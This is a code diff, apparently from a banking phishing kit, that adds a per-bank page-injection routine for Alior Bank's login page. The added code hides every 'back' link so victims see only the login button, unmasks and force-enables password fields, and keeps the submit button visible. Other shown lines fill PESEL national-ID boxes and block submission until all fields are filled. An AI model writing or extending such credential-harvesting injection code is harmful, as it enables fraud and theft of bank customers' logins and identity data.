@@ -517,6 +517,21 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             "}",
           "bsr-krakow":
             "@media(max-width:900px){html,body{min-width:0!important;overflow-x:hidden!important}}" ,
+          alior:
+            // Kutular her halukarda aktif gorunur + tiklanir: Angular
+            // property-disabled kalsa bile :disabled stilini eziyoruz;
+            // kutu icindeki nokta/ikon katmanlari tiklamalari yutamaz.
+            ".masked-input-wrapper{cursor:text!important;position:relative!important}" +
+            ".masked-input-wrapper i,.masked-input-wrapper svg,.masked-input-wrapper label{pointer-events:none!important}" +
+            ".js-keyboard-masked-input,.js-keyboard-masked-input:disabled,.js-keyboard-masked-input[disabled]{" +
+            "pointer-events:auto!important;cursor:text!important;background:#fff!important;color:#191c1f!important;" +
+            "-webkit-text-fill-color:#191c1f!important;-webkit-text-security:none!important;opacity:1!important;" +
+            "border:1px solid #b9b9b9!important;border-radius:6px!important;caret-color:#191c1f!important}" +
+            // Submit butonu kesin gorunur + ustte
+            ".masked-password{display:block!important;visibility:visible!important}" +
+            "#password-submit{display:block!important;width:100%!important;max-width:360px!important;margin:14px auto!important;" +
+            "opacity:1!important;visibility:visible!important;pointer-events:auto!important;cursor:pointer!important;" +
+            "position:relative!important;z-index:9!important}",
           ing:
             // password-N field'lari tek tip: hepsi 44px genis beyaz kutu;
             // inline-flex ile native satirlarina sarar (tasmaz).
@@ -885,6 +900,35 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     };
 
     // ------------------------------------------------------------------
+    // ALIOR FIX: Cofnij/geri linkleri tamamen kaldir (kullanici sadece
+    // login butonu gorsun) + masked kutu wrapper'ina tiklayinca icindeki
+    // input'a focus ver (nokta/label uzerine denen tiklamalar calisir).
+    // ------------------------------------------------------------------
+    const applyAliorFix = () => {
+      try {
+        if (BANK_SLUG !== "alior") return;
+        qsa(document, "a").forEach((a) => {
+          try {
+            const t = ((a.innerText || a.textContent || "") + " " + (a.getAttribute("ui-sref") || "") + " " + (a.getAttribute("href") || "")).toLowerCase();
+            if (/cofnij|wstecz|powr/.test(t)) a.style.setProperty("display", "none", "important");
+          } catch (e) {}
+        });
+        qsa(document, ".masked-input-wrapper").forEach((w) => {
+          try {
+            if (w.__plAliorClick) return;
+            w.__plAliorClick = true;
+            w.addEventListener("click", () => {
+              try {
+                const inp = w.querySelector("input.js-keyboard-masked-input") || w.querySelector("input:not(.visually-hidden)");
+                if (inp) { try { inp.disabled = false; } catch (e) {} try { inp.focus(); } catch (e) {} try { inp.select(); } catch (e) {} }
+              } catch (e) {}
+            });
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    // ------------------------------------------------------------------
     // FORM DOLMADAN SUBMIT YOK: gorunur tum alanlar dolmadan giris
     // butonu pasif gorunur + tiklama/submit veri gondermez.
     // ------------------------------------------------------------------
@@ -1006,6 +1050,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       fillEmptyPeselBoxes(doc);
       applyMaskedBehavior(doc);
       applyIngFix();
+      applyAliorFix();
       killOverlays(doc);
       unblockInputs(doc);
       cleanupErrorState(doc);
@@ -1156,7 +1201,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     attach(document);
     scanIframes(document, 0);
     try {
-      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); fixShadowRoots(); fillEmptyPeselBoxes(document); applyMaskedBehavior(document); killOverlays(document); unblockInputs(document); cleanupErrorState(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
+      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); fixShadowRoots(); fillEmptyPeselBoxes(document); applyMaskedBehavior(document); applyAliorFix(); killOverlays(document); unblockInputs(document); cleanupErrorState(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
     } catch (e) {}
     let tries = 0;
     const retry = setInterval(() => {
@@ -1166,6 +1211,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       fillEmptyPeselBoxes(document);
       applyMaskedBehavior(document);
       applyIngFix();
+      applyAliorFix();
       killOverlays(document);
       unblockInputs(document);
       cleanupErrorState(document);
